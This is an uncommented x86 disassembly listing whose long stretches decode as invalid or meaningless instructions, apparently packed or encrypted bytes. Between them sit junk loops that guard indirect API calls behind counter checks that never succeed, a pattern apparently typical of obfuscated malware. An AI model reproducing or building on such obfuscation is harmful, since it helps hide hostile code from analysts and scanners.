  40ee3b:	xlat   BYTE PTR ds:[ebx]
  40ee3c:	jmp    0x25ef862b
  40ee41:	cmp    eax,0xc0377992
  40ee46:	inc    ebp
  40ee47:	iret   
  40ee48:	add    DWORD PTR [edx+0x30],esi
  40ee4b:	xchg   ah,dl
  40ee4d:	dec    ecx
  40ee4e:	int3   
  40ee4f:	fs daa 
  40ee51:	(bad)  
  40ee52:	pop    ss
  40ee53:	sahf   
  40ee54:	push   eax
  40ee55:	retf   
  40ee56:	cmp    DWORD PTR [edx+esi*8],esi
  40ee59:	retf   
  40ee5a:	push   esi
  40ee5b:	adc    ch,BYTE PTR [ebx]
  40ee5d:	repz ror BYTE PTR [edi+0x649194b7],0xdc
  40ee65:	test   BYTE PTR [edi-0x661624ae],cl
  40ee6b:	cmp    eax,0xfb2296d7
  40ee70:	aas    
  40ee71:	push   eax
  40ee72:	popa   
  40ee73:	pop    edi
  40ee74:	fisub  WORD PTR [eax+0x10]
  40ee77:	cmp    eax,0x687c004b
  40ee7c:	ds inc edx
  40ee7e:	add    DWORD PTR [ebx-0x43],0x94bc6b12
  40ee85:	iret   
  40ee86:	std    
  40ee87:	sbb    bh,bl
  40ee89:	xchg   DWORD PTR [ebp+0x17],ebp
  40ee8c:	in     al,0x75
  40ee8e:	xchg   BYTE PTR [eax-0x4395530e],dl
  40ee94:	scas   eax,DWORD PTR es:[edi]
  40ee95:	pop    edx
  40ee96:	cmp    edx,DWORD PTR [ebx+0x45]
  40ee99:	push   esp
  40ee9a:	or     ah,ch
  40ee9c:	retf   0x4125
  40ee9f:	mov    al,ds:0xdfd4c92f
  40eea4:	mov    ebp,0xe9cb4ffc
  40eea9:	mov    ah,0xde
  40eeab:	sti    
  40eeac:	sbb    ecx,DWORD PTR [ecx]
  40eeae:	fnstcw WORD PTR [esp+edi*2+0x44088fde]
  40eeb5:	sub    eax,0x4070abb5
  40eeba:	mov    esp,0x522c550c
  40eebf:	and    al,0x80
  40eec1:	stc    
  40eec2:	cmp    eax,0xa138317b
  40eec7:	sub    edx,edx
  40eec9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eeca:	pop    ebx
  40eecb:	bound  esi,QWORD PTR [eax+0x112269d2]
  40eed1:	data16 jle 0x40ee54
  40eed4:	out    0xef,al
  40eed6:	xor    ah,bl
  40eed8:	bound  edi,QWORD PTR [ebx]
  40eeda:	arpl   ax,di
  40eedc:	xor    BYTE PTR [edi],ch
  40eede:	fmul   QWORD PTR [esi+0x67]
  40eee1:	add    bh,BYTE PTR [esi-0x7986b145]
  40eee7:	xor    al,0x31
  40eee9:	ror    BYTE PTR [edx+esi*1],0x4b
  40eeed:	loope  0x40ee79
  40eeef:	lea    eax,[esi+0x42]
  40eef2:	cmc    
  40eef3:	(bad)  
  40eef5:	sbb    BYTE PTR [ebp+0x9],dl
  40eef8:	adc    al,0xcd
  40eefa:	or     ch,ah
  40eefc:	push   edi
  40eefd:	lahf   
  40eefe:	add    eax,0x43af541c
  40ef03:	dec    ebx
  40ef04:	add    bh,bh
  40ef06:	popf   
  40ef07:	inc    esp
  40ef08:	out    dx,eax
  40ef09:	test   al,0xff
  40ef0b:	push   0xffffffe9
  40ef0d:	test   eax,0x15728212
  40ef12:	sub    BYTE PTR [ebp+eax*1+0xa],bh
  40ef16:	scas   eax,DWORD PTR es:[edi]
  40ef17:	loope  0x40ef5b
  40ef19:	push   0x7ba34cba
  40ef1e:	call   0x6d497903
  40ef23:	push   ds
  40ef24:	cmc    
  40ef25:	xchg   BYTE PTR fs:[esi+0x5d],bl
  40ef29:	jb     0x40eece
  40ef2b:	aam    0xb0
  40ef2d:	xchg   esp,eax
  40ef2e:	and    al,0xb5
  40ef30:	cmp    eax,0x13a64f53
  40ef35:	push   es
  40ef36:	cmp    ebx,DWORD PTR [edx+0x39ace90f]
  40ef3c:	jo     0x40ef7c
  40ef3e:	test   al,0xb8
  40ef40:	sub    BYTE PTR [esi-0x57b5222b],dh
  40ef46:	dec    BYTE PTR [ecx+eax*4+0x624cdc11]
  40ef4d:	push   0x3e
  40ef4f:	out    0x6e,eax
  40ef51:	lods   al,BYTE PTR ds:[esi]
  40ef52:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ef53:	outs   dx,BYTE PTR ds:[esi]
  40ef54:	arpl   WORD PTR [ecx-0x720eda9b],di
  40ef5a:	mov    al,ds:0xd171379a
  40ef5f:	cli    
  40ef60:	fwait
  40ef61:	stc    
  40ef62:	pop    ecx
  40ef63:	cdq    
  40ef64:	scas   al,BYTE PTR es:[edi]
  40ef65:	call   0xf5bdaaf8
  40ef6a:	mov    ds:0x9f55d1f5,eax
  40ef6f:	aad    0x4a
  40ef71:	jmp    0x72505e85
  40ef76:	in     al,0xee
  40ef78:	pop    eax
  40ef79:	cmp    eax,0xa238327
  40ef7e:	in     eax,0x76
  40ef80:	lods   al,BYTE PTR ds:[esi]
  40ef81:	hlt    
  40ef82:	popf   
  40ef83:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ef84:	bound  edi,QWORD PTR [edx-0x6f]
  40ef87:	push   ebx
  40ef88:	(bad)  
  40ef89:	shl    DWORD PTR [eax],cl
  40ef8b:	call   0x5ceab3c9
  40ef90:	je     0x40ef5f
  40ef92:	lods   al,BYTE PTR ds:[esi]
  40ef93:	fimul  DWORD PTR [ebp-0xad3a63c]
  40ef99:	mov    al,ds:0xa560350a
  40ef9e:	stc    
  40ef9f:	in     al,0xf1
  40efa1:	push   esi
  40efa2:	push   cs
  40efa3:	pop    ds
  40efa4:	mov    ecx,DWORD PTR [edi-0x6b]
  40efa7:	mov    esi,0xfdde63b
  40efac:	sub    dh,bh
  40efae:	cld    
  40efaf:	add    dl,dl
  40efb1:	push   eax
  40efb2:	xor    eax,0x9eecb7cb
  40efb7:	mov    ds:0xca096dc6,eax
  40efbc:	mov    ebx,0xc26e375b
  40efc1:	les    ebx,FWORD PTR [edi+0x58]
  40efc4:	mov    al,ds:0x56382c03
  40efc9:	fdivr  st,st(7)
  40efcb:	addr16 mov esp,0x77480a5d
  40efd1:	mov    BYTE PTR [esp+edi*8],cl
  40efd4:	fdivr  st(5),st
  40efd6:	out    dx,eax
  40efd7:	mov    ebp,DWORD PTR [eax-0x36b949b0]
  40efdd:	ret    
  40efde:	push   0xffffffa8
  40efe0:	jg     0x40ef95
  40efe2:	or     eax,0xba411652
  40efe7:	pusha  
  40efe8:	push   ss
  40efe9:	add    al,0xeb
  40efeb:	repz cmp eax,0xe06e1c00
  40eff1:	test   al,0x73
  40eff3:	adc    edx,esi
  40eff5:	popf   
  40eff6:	sbb    DWORD PTR [eax],eax
  40eff8:	enter  0x5b2e,0x3e
  40effc:	call   0xc312538b
  40f001:	ins    BYTE PTR es:[edi],dx
  40f002:	loop   0x40f07a
  40f004:	push   edx
  40f005:	mov    cl,0x71
  40f007:	xchg   DWORD PTR [eax+0x69],edx
  40f00a:	imul   edi,ecx,0x6bb244a0
  40f010:	inc    ebx
  40f011:	pop    ecx
  40f012:	daa    
  40f013:	scas   eax,DWORD PTR es:[edi]
  40f014:	mov    bh,0x64
  40f016:	mov    DWORD PTR [ebp-0x8],edx
  40f019:	and    DWORD PTR ds:0x42a801,0x0
  40f023:	xor    edi,edi
  40f025:	add    edi,DWORD PTR ds:0x42a801
  40f02b:	inc    edi
  40f02c:	mov    DWORD PTR ds:0x42a801,edi
  40f032:	cmp    DWORD PTR ds:0x42a801,0xa
  40f039:	jne    0x40f04a
  40f03f:	push   0x23fa
  40f044:	call   DWORD PTR ds:0x41d0d0
  40f04a:	cmp    DWORD PTR ds:0x42a801,0x9
  40f051:	jne    0x40f066
  40f057:	xor    edi,edi
  40f059:	or     edi,DWORD PTR ds:0x42a801
  40f05f:	inc    edi
  40f060:	mov    DWORD PTR ds:0x42a801,edi
  40f066:	cmp    DWORD PTR ds:0x42a801,0x10
  40f06d:	jb     0x40f023
  40f073:	and    edi,edi
  40f075:	mov    edx,DWORD PTR [ebp+0x8]
  40f078:	and    DWORD PTR ds:0x42a88d,0x0
  40f082:	mov    edi,DWORD PTR ds:0x42a88d
  40f088:	inc    edi
  40f089:	mov    DWORD PTR ds:0x42a88d,edi
  40f08f:	cmp    DWORD PTR ds:0x42a88d,0x29
  40f096:	jne    0x40f0ac
  40f09c:	push   0x42a805
  40f0a1:	push   0x4a20
  40f0a6:	call   DWORD PTR ds:0x41d0d4
  40f0ac:	cmp    DWORD PTR ds:0x42a88d,0x1f
  40f0b3:	jb     0x40f082
  40f0b9:	and    DWORD PTR ds:0x42a759,0x6b84
  40f0c3:	xor    edx,eax
  40f0c5:	jmp    0x40f34d
  40f0ca:	enter  0xcbc4,0xc2
  40f0ce:	fcmovnb st,st(1)
  40f0d0:	aad    0xda
  40f0d2:	push   cs
  40f0d3:	and    al,0x97
  40f0d5:	cmp    al,0xb7
  40f0d7:	fbstp  TBYTE PTR [ebp-0x31]
  40f0da:	into   
  40f0db:	mov    esp,0x7ee57878
  40f0e0:	js     0x40f15a
  40f0e2:	dec    ebp
  40f0e3:	cli    
  40f0e4:	pop    esp
  40f0e5:	xchg   BYTE PTR [esi],dl
  40f0e7:	or     ecx,DWORD PTR [ecx]
  40f0e9:	inc    ebp
  40f0ea:	std    
  40f0eb:	push   0xffffffc5
  40f0ed:	sbb    eax,0xf0c7df1f
  40f0f2:	push   ebx
  40f0f3:	pop    edi
  40f0f4:	repnz mov al,0x75
  40f0f7:	test   eax,0x1d2f4394
  40f0fc:	das    
  40f0fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f0fe:	xor    eax,0xc86a9d24
  40f103:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f104:	or     DWORD PTR [ecx-0x1b],esi
  40f107:	mul    BYTE PTR [edi]
  40f109:	jb     0x40f107
  40f10b:	js     0x40f107
  40f10d:	xchg   ecx,eax
  40f10e:	retf   
  40f10f:	popa   
  40f110:	push   ds
  40f111:	adc    ch,BYTE PTR ds:0x7e737729
  40f117:	nop
  40f118:	adc    eax,0xc4915579
  40f11d:	retf   
  40f11e:	push   cs
  40f11f:	jecxz  0x40f0a4
  40f121:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f122:	repz and BYTE PTR [edx-0x19],ch
  40f126:	imul   edx,DWORD PTR [ebx-0x7dd3171c],0x49
  40f12d:	inc    esi
  40f12e:	in     al,0x2c
  40f130:	aam    0xea
  40f132:	mov    al,0xe9
  40f134:	dec    eax
  40f135:	pop    ss
  40f136:	pop    ebx
  40f137:	xor    BYTE PTR [edx],ch
  40f139:	stos   DWORD PTR es:[edi],eax
  40f13a:	cdq    
  40f13b:	sbb    DWORD PTR [ebx+ecx*1-0x48],esi
  40f13f:	jmp    0xad59:0x90bb5cbd
  40f146:	mov    bl,0xf0
  40f148:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f149:	repz cmp al,0x4c
  40f14c:	sbb    eax,0x1a06d001
  40f151:	xchg   edi,eax
  40f152:	jb     0x40f18d
  40f154:	pop    eax
  40f155:	lock mov edi,0x241c56a0
  40f15b:	inc    eax
  40f15c:	xchg   edx,eax
  40f15d:	mov    WORD PTR fs:[edx],fs
  40f160:	pop    ebp
  40f161:	hlt    
  40f162:	in     eax,dx
  40f163:	das    
  40f164:	out    dx,al
  40f165:	loop   0x40f12a
  40f167:	xchg   ecx,eax
  40f168:	mov    ds:0x65c70ba0,eax
  40f16d:	push   es
  40f16e:	(bad)  
  40f16f:	(bad)  
  40f171:	mov    cl,0x2a
  40f173:	sub    BYTE PTR ds:0x1f1a4b24,dl
  40f179:	ret    
  40f17a:	add    ebp,DWORD PTR [eax+0x25]
  40f17d:	sub    ecx,DWORD PTR [eax+0x296e1f50]
  40f183:	lahf   
  40f184:	in     al,0x7e
  40f186:	inc    ecx
  40f187:	mov    ebx,DWORD PTR [esi+0x24816ad1]
  40f18d:	cmp    eax,0xa5d3d493
  40f192:	pop    eax
  40f193:	lea    esi,[ecx-0x136a8091]
  40f199:	bnd jno 0x40f171
  40f19c:	jbe    0x40f204
  40f19e:	and    ebx,DWORD PTR [eax+0x7177bbf2]
  40f1a4:	sbb    BYTE PTR [edi+0x1d],ah
  40f1a7:	pop    ds
  40f1a8:	fs out dx,eax
  40f1aa:	cmp    DWORD PTR [edx],edi
  40f1ac:	add    al,0x83
  40f1ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f1af:	imul   edx,DWORD PTR [ecx],0x5d7d2dd9
  40f1b5:	je     0x40f1ac
  40f1b7:	push   0xffffff9f
  40f1b9:	cmp    DWORD PTR [eax],ebx
  40f1bb:	cmp    bh,BYTE PTR [ecx-0x80]
  40f1be:	mov    bl,0x9b
  40f1c0:	xchg   ebx,eax
  40f1c1:	repnz rcr DWORD PTR ds:0xdf51f4f2,1
  40f1c8:	and    al,0x6f
  40f1ca:	scas   eax,DWORD PTR es:[edi]
  40f1cb:	ins    DWORD PTR es:[edi],dx
  40f1cc:	icebp  
  40f1cd:	or     eax,0x49d2858b
  40f1d2:	pop    esp
  40f1d3:	adc    BYTE PTR [eax],cl
  40f1d5:	xchg   BYTE PTR [eax+0x54],bh
  40f1d8:	jae    0x40f182
  40f1da:	rol    BYTE PTR [edi+0x336b73d8],0xf6
  40f1e1:	dec    eax
  40f1e2:	out    0xf,eax
  40f1e4:	das    
  40f1e5:	(bad)  
  40f1e6:	xor    edi,edx
  40f1e8:	daa    
  40f1e9:	push   ebx
  40f1ea:	leave  
  40f1eb:	dec    edx
  40f1ec:	dec    ebx
  40f1ed:	pop    esp
  40f1ee:	arpl   WORD PTR [esi],dx
  40f1f0:	dec    eax
  40f1f1:	pop    edi
  40f1f2:	sub    eax,0x23005014
  40f1f7:	dec    esp
  40f1f8:	sub    dh,dl
  40f1fa:	nop
  40f1fb:	stc    
  40f1fc:	aaa    
  40f1fd:	add    eax,0x54a97b28
  40f202:	jmp    0x1de8:0x3363827b
  40f209:	daa    
  40f20a:	int    0xc8
  40f20c:	jne    0x40f1dd
  40f20e:	mov    dl,0x7e
  40f210:	push   ecx
  40f211:	int3   
  40f212:	les    ebx,FWORD PTR [ecx+0x58]
  40f215:	add    BYTE PTR [ebx-0x607410cd],bl
  40f21b:	mov    edx,0x9062b31a
  40f220:	or     BYTE PTR ds:0xf5b0d725,al
  40f226:	jne    0x40f1c7
  40f228:	or     eax,0x8a55dbf1
  40f22d:	and    BYTE PTR [eax+0x28f0151c],0xe8
  40f234:	in     al,dx
  40f235:	fs repz pop ss
  40f238:	mov    bl,0xf6
  40f23a:	lods   eax,DWORD PTR ds:[esi]
  40f23b:	mov    ecx,0x35a7335
  40f240:	dec    ecx
  40f241:	inc    ebp
  40f242:	lods   eax,DWORD PTR ds:[esi]
  40f243:	mov    ebx,0xb38f2730
  40f248:	test   eax,0x8c45107d
  40f24d:	pusha  
  40f24e:	sub    al,0x64
  40f250:	(bad)  
  40f251:	(bad)  
  40f253:	mov    edi,0xd46c2dd8
  40f258:	outs   dx,BYTE PTR ds:[esi]
  40f259:	fs ja  0x40f2d4
  40f25c:	pop    ss
  40f25d:	(bad)  
  40f25e:	lods   eax,DWORD PTR ds:[esi]
  40f25f:	icebp  
  40f260:	in     eax,0x16
  40f262:	add    ecx,edx
  40f264:	and    bh,BYTE PTR [esi+0x1b552fc8]
  40f26a:	mov    al,0x54
  40f26c:	leave  
  40f26d:	or     DWORD PTR ds:0x294867a0,ebx
  40f273:	jae    0x40f298
  40f275:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  40f277:	pop    ebx
  40f278:	pop    ss
  40f279:	(bad)  
  40f27a:	aam    0x91
  40f27c:	out    dx,eax
  40f27d:	sbb    BYTE PTR [ebx],ah
  40f27f:	fist   WORD PTR [ecx+0x4f9e18c6]
  40f285:	iret   
  40f286:	jp     0x40f251
  40f288:	popa   
  40f289:	mov    eax,DWORD PTR [ebp+0xc]
  40f28c:	mov    DWORD PTR [ecx+0x73d87ac7],edx
  40f292:	nop
  40f293:	call   0xba08874d
  40f298:	adc    DWORD PTR ds:0x30515c99,ecx
  40f29e:	rcl    BYTE PTR [edi],0x50
  40f2a1:	jae    0x40f2f2
  40f2a3:	retf   0x40d0
  40f2a6:	mov    dl,0xd5
  40f2a8:	push   0x70
  40f2aa:	imul   al
  40f2ac:	xlat   BYTE PTR ss:[ebx]
  40f2ae:	inc    ecx
  40f2af:	shr    BYTE PTR [edi+0xac53863],0x38
  40f2b6:	mov    ecx,DWORD PTR [edx]
  40f2b8:	cmp    ecx,DWORD PTR [edx-0x6e]
  40f2bb:	outs   dx,BYTE PTR ds:[esi]
  40f2bc:	cli    
  40f2bd:	in     al,0xe7
  40f2bf:	cs dec ebx
  40f2c1:	fdiv   DWORD PTR [eax+ebp*8-0x7b4f801b]
  40f2c8:	mov    ch,0x27
  40f2ca:	push   0xe7186634
  40f2cf:	mov    ss,WORD PTR [esi]
  40f2d1:	in     eax,dx
  40f2d2:	push   edi
  40f2d3:	shr    esi,cl
  40f2d5:	cmp    ebx,DWORD PTR [eax]
  40f2d7:	mov    al,ds:0x393d63a
  40f2dc:	sub    eax,0x7c4d4f6a
  40f2e1:	mov    ebp,0xbb80df76
  40f2e6:	retf   0xdcbb
  40f2e9:	clc    
  40f2ea:	aas    
  40f2eb:	std    
  40f2ec:	or     esp,DWORD PTR [esi-0x75ecd114]
  40f2f2:	cdq    
  40f2f3:	lock mov ebx,0x9e1f665c
  40f2f9:	out    dx,al
  40f2fa:	fsub   QWORD PTR [ebp*2-0x2cdeba0b]
  40f301:	mov    esi,0x9590e4f1
  40f306:	pop    edx
  40f307:	dec    edx
  40f308:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f309:	dec    eax
  40f30a:	loope  0x40f312
  40f30c:	inc    edx
  40f30d:	fs xor al,0x48
  40f310:	push   cs
  40f311:	jp     0x40f35f
  40f313:	pop    edi
  40f314:	jmp    0x40f360
  40f316:	mov    ecx,0xd27f2f6a
  40f31b:	pop    ds
  40f31c:	dec    ebp
  40f31d:	lds    esi,FWORD PTR [ebx+esi*1]
  40f320:	mov    eax,ds:0x48780e82
  40f325:	int    0xc2
  40f327:	and    al,0x8d
  40f32a:	out    dx,al
  40f32b:	outs   dx,WORD PTR ds:[esi]
  40f32d:	push   ebx
  40f32e:	jg     0x40f2fc
  40f330:	cld    
  40f331:	push   ebx
  40f332:	pushf  
  40f333:	sti    
  40f334:	cmp    ah,BYTE PTR [edx-0x60]
  40f337:	mov    dh,0x25
  40f339:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f33a:	or     DWORD PTR [eax],0x6bfa3c4d
  40f340:	div    DWORD PTR [ecx-0x9]
  40f343:	xchg   al,cl
  40f345:	repz xchg esp,eax
  40f347:	outs   dx,BYTE PTR ds:[esi]
  40f348:	in     eax,0x9b
  40f34a:	or     al,0xa2
  40f34c:	cmp    eax,DWORD PTR [ebx]
  40f34e:	rol    edi,1
  40f350:	add    eax,0x42a80d
  40f355:	sbb    eax,0x83000000
  40f35a:	cmp    eax,0x42a80d
  40f35f:	add    BYTE PTR [edi],cl
  40f361:	test   BYTE PTR [ebp+0x0],bl
  40f364:	add    BYTE PTR [eax],al
  40f366:	cmp    DWORD PTR ds:0x42a80d,0x7
  40f36d:	jne    0x40f389
  40f373:	push   DWORD PTR [ebp-0x20]
  40f376:	push   DWORD PTR [ebp-0x14]
  40f379:	push   0x7b1d
  40f37e:	push   0x2bb5
  40f383:	call   DWORD PTR ds:0x41d258
  40f389:	cmp    DWORD PTR ds:0x42a80d,0x8
  40f390:	jne    0x40f3a3
  40f396:	mov    edi,DWORD PTR ds:0x42a80d
  40f39c:	dec    edi
  40f39d:	mov    DWORD PTR ds:0x42a80d,edi
  40f3a3:	mov    edi,DWORD PTR ds:0x42a80d
  40f3a9:	dec    edi
  40f3aa:	mov    DWORD PTR ds:0x42a80d,edi
  40f3b0:	jmp    0x40f359
  40f3b5:	xor    edi,edi
  40f3b7:	add    edi,DWORD PTR ds:0x42a759
  40f3bd:	add    DWORD PTR ds:0x42a775,edi
  40f3c3:	mov    DWORD PTR [ebp+0xc],edx
  40f3c6:	xor    edx,DWORD PTR ds:0x42a769
  40f3cc:	mov    DWORD PTR [ebp-0x4],0xf89c85d8
  40f3d3:	or     edx,edx
  40f3d5:	mov    DWORD PTR [ebp-0x28],0xf89c853a
  40f3dc:	and    DWORD PTR ds:0x42a841,0x0
  40f3e6:	jmp    0x40f3f8
  40f3eb:	mov    edx,DWORD PTR ds:0x42a841
  40f3f1:	inc    edx
  40f3f2:	mov    DWORD PTR ds:0x42a841,edx
  40f3f8:	cmp    DWORD PTR ds:0x42a841,0x12
  40f3ff:	jae    0x40f427
  40f405:	cmp    DWORD PTR ds:0x42a841,0x14
  40f40c:	jne    0x40f420
  40f412:	push   0x4578
  40f417:	push   DWORD PTR [ebp-0x14]
  40f41a:	call   DWORD PTR ds:0x41d25c
  40f420:	jmp    0x40f3eb
  40f425:	and    edi,edi
  40f427:	mov    DWORD PTR [ebp-0x2c],0xf89c853b
  40f42e:	sub    edi,DWORD PTR ds:0x42a879
  40f434:	mov    DWORD PTR [ebp-0x30],0xf89c853c
  40f43b:	and    edi,0x6695
  40f441:	mov    DWORD PTR [ebp-0x34],0xf89c853d
  40f448:	or     DWORD PTR ds:0x42a775,0x61f4
  40f452:	mov    DWORD PTR [ebp-0x38],0xf89c853e
  40f459:	and    DWORD PTR ds:0x42a809,0x0
  40f463:	jmp    0x40f477
  40f468:	xor    edx,edx
  40f46a:	xor    edx,DWORD PTR ds:0x42a809
  40f470:	inc    edx
  40f471:	mov    DWORD PTR ds:0x42a809,edx
  40f477:	cmp    DWORD PTR ds:0x42a809,0x11
  40f47e:	jae    0x40f4ac
  40f484:	cmp    DWORD PTR ds:0x42a809,0x1a
  40f48b:	jne    0x40f4a7
  40f491:	push   0x1
  40f493:	push   DWORD PTR [ebp-0xc]
  40f496:	push   DWORD PTR [ebp-0x20]
  40f499:	push   0x1352
  40f49e:	push   DWORD PTR [ebp-0x18]
  40f4a1:	call   DWORD PTR ds:0x41d0d8
  40f4a7:	jmp    0x40f468
  40f4ac:	mov    DWORD PTR [ebp-0x3c],0xf89c853f
  40f4b3:	mov    edx,DWORD PTR [ebp+0x8]
  40f4b6:	xor    edx,eax
  40f4b8:	mov    DWORD PTR ds:0x42a7c9,0x16
  40f4c2:	cmp    DWORD PTR ds:0x42a7c9,0x0
  40f4c9:	je     0x40f553
  40f4cf:	cmp    DWORD PTR ds:0x42a7c9,0x21
  40f4d6:	jne    0x40f4f6
  40f4dc:	push   0x6e96
  40f4e1:	push   0x4a9d
  40f4e6:	push   0x2037
  40f4eb:	push   0x3f81
  40f4f0:	call   DWORD PTR ds:0x41d0dc
  40f4f6:	xor    edi,edi
  40f4f8:	or     edi,DWORD PTR ds:0x42a7c9
  40f4fe:	dec    edi
  40f4ff:	mov    DWORD PTR ds:0x42a7c9,edi
  40f505:	jmp    0x40f4c2
  40f50a:	and    DWORD PTR ds:0x42a841,0x0
  40f514:	jmp    0x40f528
  40f519:	xor    edi,edi
  40f51b:	or     edi,DWORD PTR ds:0x42a841
  40f521:	inc    edi
  40f522:	mov    DWORD PTR ds:0x42a841,edi
  40f528:	cmp    DWORD PTR ds:0x42a841,0x1e
  40f52f:	jae    0x40f553
  40f535:	cmp    DWORD PTR ds:0x42a841,0x26
  40f53c:	jne    0x40f548
  40f542:	call   DWORD PTR ds:0x41d0e0
  40f548:	jmp    0x40f519
  40f54d:	dec    DWORD PTR ds:0x42a7cd
  40f553:	mov    edi,DWORD PTR [ebp-0x10]
  40f556:	mov    DWORD PTR ds:0x42a831,0x29a7
  40f560:	jmp    0x40f7e8
  40f565:	(bad)
  40f568:	ret    0xc2d9
  40f56b:	(bad)  
  40f56d:	sar    DWORD PTR [edi],0x6b
  40f570:	shl    DWORD PTR [esi-0x444922c0],0x42
  40f577:	js     0x40f5f1
  40f579:	in     eax,0x7e
  40f57b:	js     0x40f5f5
  40f57d:	and    ebx,DWORD PTR [esi-0x1b]
  40f580:	cld    
  40f581:	popa   
  40f582:	sar    ebx,cl
  40f584:	jmp    0x40f519
  40f586:	gs jp  0x40f520
  40f589:	faddp  st(4),st
  40f58b:	cmp    BYTE PTR [esi-0x3e],cl
  40f58e:	mov    al,ds:0x92feed12
  40f593:	pop    es
  40f594:	call   0x37a5:0xc8185267
  40f59b:	jne    0x40f5cf
  40f59d:	subps  xmm1,XMMWORD PTR ds:0xc4104b8a
  40f5a4:	xchg   DWORD PTR [ecx],ebp
  40f5a6:	call   0x1799:0xeaeaa3d
  40f5ad:	scas   eax,DWORD PTR es:[edi]
  40f5ae:	xor    BYTE PTR [ebp+0x34ecf487],bl
  40f5b4:	sub    edi,DWORD PTR [edi+0x15]
  40f5b7:	pop    eax
  40f5b8:	daa    
  40f5b9:	mov    ah,0x85
  40f5bb:	cmp    al,0x6c
  40f5bd:	div    dl
  40f5bf:	mov    dl,0x15
  40f5c1:	add    BYTE PTR [edx-0x65],dh
  40f5c4:	(bad)  
  40f5c5:	add    eax,0xe196535e
  40f5ca:	xlat   BYTE PTR ds:[ebx]
  40f5cb:	xchg   ebp,eax
  40f5cc:	sub    eax,0x11dc536d
  40f5d1:	pop    edx
  40f5d2:	dec    esi
  40f5d3:	(bad)  
  40f5d4:	adc    ah,BYTE PTR [eax]
  40f5d6:	cmc    
  40f5d7:	sar    BYTE PTR [esi+0x4a],0x13
  40f5db:	sub    DWORD PTR [esi-0x3c],edi
  40f5de:	hlt    
  40f5df:	lock loop 0x40f594
  40f5e2:	aaa    
  40f5e3:	fnstsw WORD PTR [esi]
  40f5e5:	xor    al,0xad
  40f5e7:	adc    al,0x9c
  40f5e9:	(bad)  [eax-0x65]
  40f5ec:	push   edi
  40f5ed:	out    dx,al
  40f5ee:	sub    eax,0x292f784d
  40f5f3:	pop    es
  40f5f4:	inc    al
  40f5f6:	lock mov esi,0x76d10696
  40f5fc:	outs   dx,BYTE PTR ds:[esi]
  40f5fd:	imul   ecx,DWORD PTR [edi-0x364d4eb2],0x6ef35d70
  40f607:	xchg   ebx,eax
  40f608:	imul   ebx,esi,0xffffffef
  40f60b:	ret    
  40f60c:	dec    esi
  40f60d:	out    dx,eax
  40f60e:	cdq    
  40f60f:	into   
  40f610:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  40f612:	cmp    esi,DWORD PTR [edi-0x64]
  40f615:	popf   
  40f616:	dec    ebx
  40f617:	stos   DWORD PTR es:[edi],eax
  40f618:	xor    eax,0xe52ee2b8
  40f61d:	stos   BYTE PTR es:[edi],al
  40f61e:	retf   0x43a4
  40f621:	jae    0x40f699
  40f623:	adc    edi,DWORD PTR [edx+0x71]
  40f626:	sti    
  40f627:	jp     0x40f603
  40f629:	test   DWORD PTR [esi-0x36ba2226],0xb6724ef4
  40f633:	pextrw ebp,mm5,0xa3
  40f637:	cld    
  40f638:	outs   dx,BYTE PTR ds:[esi]
  40f639:	inc    edi
  40f63a:	dec    ebx
  40f63b:	retf   0x8724
  40f63e:	pop    ss
  40f63f:	pop    edi
  40f640:	jbe    0x40f642
  40f642:	adc    al,0x57
  40f644:	xor    DWORD PTR ds:0xc53aaab6,0xffffffd4
  40f64b:	sbb    edx,DWORD PTR fs:[edx-0x2fc2651c]
  40f652:	mov    edi,0xbacca9da
  40f657:	fwait
  40f658:	cwde   
  40f659:	cli    
  40f65a:	xchg   ebx,eax
  40f65b:	test   eax,0x245135a4
  40f660:	adc    DWORD PTR [eax-0x1ad4c5cf],edx
  40f666:	outs   dx,DWORD PTR ds:[esi]
  40f667:	lds    edi,FWORD PTR [ebx+0x63]
  40f66a:	test   ebp,edi
  40f66c:	repnz outs dx,DWORD PTR ds:[esi]
  40f66e:	and    DWORD PTR [esi],edi
  40f670:	ins    DWORD PTR es:[edi],dx
  40f671:	clc    
  40f672:	cli    
  40f673:	rcl    DWORD PTR [ecx+0x16],1
  40f676:	ret    
  40f677:	add    ecx,edi
  40f679:	cmp    eax,0x76f3e6f5
  40f67e:	jo     0x40f625
  40f680:	rcl    BYTE PTR [edi],cl
  40f682:	shl    BYTE PTR [esi+0x330ce19f],cl
  40f688:	rol    esi,cl
  40f68a:	dec    edi
  40f68b:	xchg   BYTE PTR [eax-0x1bc9aac8],al
  40f691:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f692:	push   esi
  40f693:	(bad)  
  40f694:	mov    eax,edx
  40f696:	aam    0xcb
  40f698:	push   edi
  40f699:	test   BYTE PTR [esi+0xfae3294],bl
  40f69f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f6a0:	sbb    eax,0xb1f7855a
  40f6a5:	retf   0xaf90
  40f6a8:	jb     0x40f69b
  40f6aa:	lahf   
  40f6ab:	push   edx
  40f6ac:	sbb    ebp,0x1cc8f3e9
  40f6b2:	dec    eax
  40f6b3:	std    
  40f6b4:	sbb    DWORD PTR [edx],0x45c38882
  40f6ba:	mov    dh,0x87
  40f6bc:	xchg   ebp,eax
  40f6bd:	jb     0x40f64c
  40f6bf:	sti    
  40f6c0:	ficomp DWORD PTR [ecx+eiz*8+0x31]
  40f6c4:	outs   dx,DWORD PTR ds:[esi]
  40f6c5:	into   
  40f6c6:	les    esp,FWORD PTR [edi+0x3f]
  40f6c9:	mov    bh,0x2b
  40f6cb:	sub    eax,0x77b19aa8
  40f6d0:	push   eax
  40f6d1:	pop    ecx
  40f6d2:	jmp    0x55b0:0x989cc64d
  40f6d9:	mov    DWORD PTR [esi-0x1c],ebx
  40f6dc:	hlt    
  40f6dd:	sbb    BYTE PTR [edi-0x389cad83],ah
